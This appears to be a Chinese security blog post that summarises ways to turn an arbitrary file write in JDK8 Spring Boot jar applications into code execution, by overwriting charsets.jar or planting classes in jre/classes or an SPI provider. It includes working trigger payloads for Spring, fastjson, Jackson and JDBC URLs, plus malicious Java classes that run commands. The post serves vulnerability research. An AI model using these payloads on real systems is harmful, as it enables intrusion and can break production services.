0x01 前言
=======

在对某产品进行挖掘时，发现了一个任意文件写的漏洞口，项目是以jar包的形式来运行的，在这种场景下除了能够覆盖掉服务器上的文件之外，似乎无法做其他操作。

尝试过计划任务无果，看到后台有一处重启功能，由于项目是由多个jar包共同运作，遂想到是否可以通过覆盖服务器上某个jar包，通过重启功能，在启动时加载jar包完成getshell的操作，不过这种方式虽然可行，但只能在目标机器上操作一次，破坏性较大。

landgrey师傅对此种场景早就进行过探索[Spring Boot Fat Jar 写文件漏洞到稳定 RCE 的探索](https://landgrey.me/blog/22/)，我是通过文内给出的方案解决了问题，在搜集资料的同时也发现了三梦师傅的方案：[JDK8任意文件写场景下的SpringBoot RCE](https://threedr3am.github.io/2021/04/14/JDK8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%9C%BA%E6%99%AF%E4%B8%8B%E7%9A%84SpringBoot%20RCE/)和[JDK8任意文件写场景下的Fastjson RCE](https://threedr3am.github.io/2021/04/13/JDK8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%9C%BA%E6%99%AF%E4%B8%8B%E7%9A%84Fastjson%20RCE/)，但由于目标服务器上不存在jre/classes目录，且不具有创建权限，同时也由于问题被解决，当时并没有做进一步了解，最近又翻出来这篇文章进行学习，本文仅是对两者的方案做归纳。

0x02 类加载
========

利用Class.forName默认情况下是会去执行类中static块内的内容，例如:

Class.forName("Evil");

就相当于：

Class.forName("Evil",true,classLoader);

其中的true参数正是指定对该类执行初始化操作。

在排查java程序的冲突时，通常通过jvm参数-XX:+TraceClassLoading来打印出过程，随意执行一个程序并且带上该参数即可以观察到类似如下的类装载的过程：

Loaded com.sun.javafx.logging.JFRLogger$2 from file:/Library/Java/JavaVirtualMachines/jdk1.8.0\_181.jdk/Contents/Home/jre/lib/ext/jfxrt.jar\]  
\[Opened /Library/Java/JavaVirtualMachines/jdk1.8.0\_181.jdk/Contents/Home/jre/lib/jfr.jar\]  
\[Loaded com.oracle.jrockit.jfr.EventInfo from /Library/Java/JavaVirtualMachines/jdk1.8.0\_181.jdk/Contents/Home/jre/lib/jfr.jar\]  
\[Loaded com.oracle.jrockit.jfr.EventToken from /Library/Java/JavaVirtualMachines/jdk1.8.0\_181.jdk/Contents/Home/jre/lib/jfr.jar\]

这一装载过程会选择性地装载以下四个jar:

rt.jar  
jfr.jar  
jsse.jar  
jce.jar

例如用到java.io.IOException则是从jre/lib/rt.jar中装载，通过覆盖以上任意四个jar，从TraceClassLoading中选取一个会被装载且初始化的类，搭配开头提到的重启场景即可完成rce，但这一操作存在的问题即是容易影响到服务的正常运行。

根据jdk8下的类加载机制可推断，在加载时按顺序分别从引导类加载器，扩展类加载器，应用程序类加载器及自定义类加载器，对应的Bootstrap和Ext ClassLoader分别为引导类和扩展类，在本地测试时可以通过System.getProperty("sun.boot.class.path")获取到引导类加载路径下的文件、目录如下（mac下）：

Home/jre/lib/resources.jar  
Home/jre/lib/rt.jar  
Home/jre/lib/sunrsasign.jar  
Home/jre/lib/jsse.jar  
Home/jre/lib/jce.jar  
Home/jre/lib/charsets.jar  
Home/jre/lib/jfr.jar  
Home/jre/classes

 扩展类java.ext.dirs（mac下）:

/Users/xxx/Library/Java/Extensions  
/Library/Java/JavaVirtualMachines/jdk1.8.0\_181.jdk/Contents/Home/jre/lib/ext  
/Library/Java/Extensions  
/Network/Library/Java/Extensions  
/System/Library/Java/Extensions  
/usr/lib/java

应用程序类加载器对应classpath。

通过覆盖以上的类搭配Class.forName都可以完成利用，以charsets为例。

0x03 利用charsets
===============

在类加载一节可以见得在启动java程序时不会opened charsets.jar，只有在该jar包内的某个类被调用时才会opened，例如:

public class Test { public static void main(String\[\] args) {  
 try {  
 Class.forName("sun.nio.cs.ext.GBK");  
 } catch (ClassNotFoundException e) {  
 e.printStackTrace();  
 }  
 }  
}  
//javac Test.java   
//jar -cvf Test.jar Test.class  
//java -XX:+TraceClassLoading -cp Test.jar Test

能够看到在程序结束前从charsets.jar中装载了sun.nio.cs.ext.GBK类，如图1：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-c45130526174945955dc9606a40ccc6af2d8c52a.png)

图1 TraceClassLoading内容

现在的思路就是寻找一个触发点，针对几种场景有不同的触发点。

1.spring-web

accept头的触发方式。

GET / HTTP/1.1  
Accept: text/html;charset=GBK

在org.springframework.web.accept.HeaderContentNegotiationStrategy#resolveMediaTypes处解析accept头，如图2：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-3c00089f7167fb098b208389ddbf39ea7620ee5b.png)

图2 resolveMediaTypes函数代码

主要是在org.springframework.util.MimeType#checkParameters处，如图3：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-cb5e0e1595851e99c69c54dc21c4f102488041ba.png)

图3 checkParameters函数代码

Charset.forName比较关键，在加载字符编码时会尝试从缓存中读取，否则依次从一下三个provider中加载：

standardProvider JDK 定义的标准格式，如 UTF-8，UTF-16extendedProvider JDK 扩展的标准格式  
CharsetProvider SPI，通过 java.nio.charset.spi.CharsetProvider 自定义的格式

从lookupExtendedCharset进入，最后调用Class.forName，如图4：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-c302c9528dfecce96867584d99cc63f003b2eb70.png)

图4 Class.forName函数代码

触发点主要在于Charset.forName，简单搜索一下就可以发现还有类似的满足条件的点，例如org.springframework.http.ContentDisposition#parse，图5:

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-3ba1e92453a108c6424f6158e38037f9420eca7f.png)

图5 parse函数代码

利用上传包来完成利用：

Content-Type: multipart/form-data; boundary=a  
Content-Length: 83

\--a  
Content-Disposition: form-data; name="file"; filename\*="GBK'test'"

xxx  
\--a

1.fastjson

{ "x":{  
 "@type":"java.nio.charset.Charset",  
 "val":"IBM33722"  
 }  
}

1.2.76由于java.nio.charset.Charset在白名单中，可直接绕autoType，最后调用到与spring同样的位置。

2.JackSon

开启enableDefaultTyping情况下:

\["sun.nio.cs.ext.IBM33722",{"x":"y"}\]

3.jdbc url getConnection

GET /jdbc?url=jdbc:mysql://127.0.0.1:3306/test?statementInterceptors=sun.nio.cs.ext.IBM33722

4.Class forName

5.loadClass newInstance

0x04 利用jre/lib/ext
==================

往ext写入需要将拓展的classes打包为jar，通过ExtClassLoader去加载。利用场景需要如文章开头所述，在应用中有重启功能时才能够被加载。

0x05 利用jre/classes
==================

jre/classes目录默认不存在，利用条件有一点就是需要能够创建目录，往jre/classes写入的类与往classpath写入一般，可直接被加载，不同于ext，该目录下写入的为class后缀的文件即可。

参考三梦师傅的做法，在fastjson小于1.2.68下，往jre/classes下塞入一个实现了**java.lang.AutoCloseable**的恶意类（无需打包为jar，为class即可）。

import java.io.IOException;

/\*\*  
 \* @author threedr3am  
 \*/  
public class Evil implements AutoCloseable {

 static {  
 try {  
 Runtime.getRuntime().exec("/System/Applications/Calculator.app/Contents/MacOS/Calculator");  
 } catch (IOException e) {  
 e.printStackTrace();  
 }  
 }

 @Override  
 public void close() throws Exception {

 }  
}

同样的只能触发一次，下次需要换写文件名，效果如图6。

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-3de56a18b01e46693af779433a6b5866d94c52ae.png)

图6 效果图

0x06 利用SPI
==========

在上文提到Charset.forName中有三个provider：

standardProvider JDK 定义的标准格式，如 UTF-8，UTF-16extendedProvider JDK 扩展的标准格式  
CharsetProvider SPI，通过 java.nio.charset.spi.CharsetProvider 自定义的格式

在java.nio.charset.Charset#lookupViaProviders：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-951594b54f30f4bc15de3941380cf18450dfbce3.png)

图7 lookupViaProviders函数图

跟入java.nio.charset.Charset#providers：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-a140677f5ede0ef7796df20d9f59f727af1a4418.png)  
图8 providers函数图

ServiceLoader即为spi的加载机制。

对于charset的SPI的利用点在于第三个provider，通过编写CharsetProvider的实现类，利用SPI机制，完成利用，同样的选择将spi和class放入jre/classes中。

SPI的加载规则是根据jar包中META-INF下services下的文件来查找对应实现类的。在META-INF下services下会定义一个文件，其文件名是接口类的全类型，而文件的内容是实现类的全类名。\[6\]

对应到这一个场景是利用java.nio.charset.spi.CharsetProvider接口，位于META-INF/services目录下，文件内容为加载的实现了java.nio.charset.spi.CharsetProvider的恶意类。（代码源自开头中三梦师傅的文章）

import java.io.IOException;  
import java.nio.charset.Charset;  
import java.util.HashSet;  
import java.util.Iterator;

/\*\*  
 \* @author threedr3am  
 \*/  
public class Evil extends java.nio.charset.spi.CharsetProvider {

 @Override  
 public Iterator&lt;Charset&gt; charsets() {  
 return new HashSet&lt;Charset&gt;().iterator();  
 }

 @Override  
 public Charset charsetForName(String charsetName) {  
 //因为Charset会被缓存，导致同样的charsetName只能执行一次，所以，我们可以利用前缀触发，后面的内容不断变化就行了，甚至可以把命令通过charsetName传入 if (charsetName.startsWith("Evil")) {  
 try {  
 Runtime.getRuntime().exec("/System/Applications/Calculator.app/Contents/MacOS/Calculator");  
 } catch (IOException e) {  
 e.printStackTrace();  
 }  
 }  
 return Charset.forName("UTF-8");  
 }  
}

0x07 其他
=======

笔者在挖掘漏洞时是基于对服务器可控的情况下，可直接看到服务器上的JDK目录，所以在实际场景中可能需要对jdk目录做爆破，LandGrey师傅制作了对应的环境，同时也对目录做了收集\[2\].

在上传时一般也无法创建目录，同时classes目录通常需要用户自行创建，所以classes和spi的利用方式可能相对于直接覆盖charset.jar的方式来说实用性较差，但直接覆盖charset.jar确实存在有破坏目标环境的可能性。

0x08 参考
=======

\[1\]<https://landgrey.me/blog/22/>

\[2\]<https://github.com/LandGrey/spring-boot-upload-file-lead-to-rce-tricks>

\[3\]<https://threedr3am.github.io/2021/04/14/JDK8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%9C%BA%E6%99%AF%E4%B8%8B%E7%9A%84SpringBoot%20RCE/>

\[4\]<https://threedr3am.github.io/2021/04/13/JDK8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%9C%BA%E6%99%AF%E4%B8%8B%E7%9A%84Fastjson%20RCE/>

\[5\]<https://www.cnblogs.com/Ye-ye/p/12748365.html>

\[6\][https://blog.csdn.net/weixin\_30568317/article/details/114965999](https://blog.csdn.net/weixin_30568317/article/details/114965999)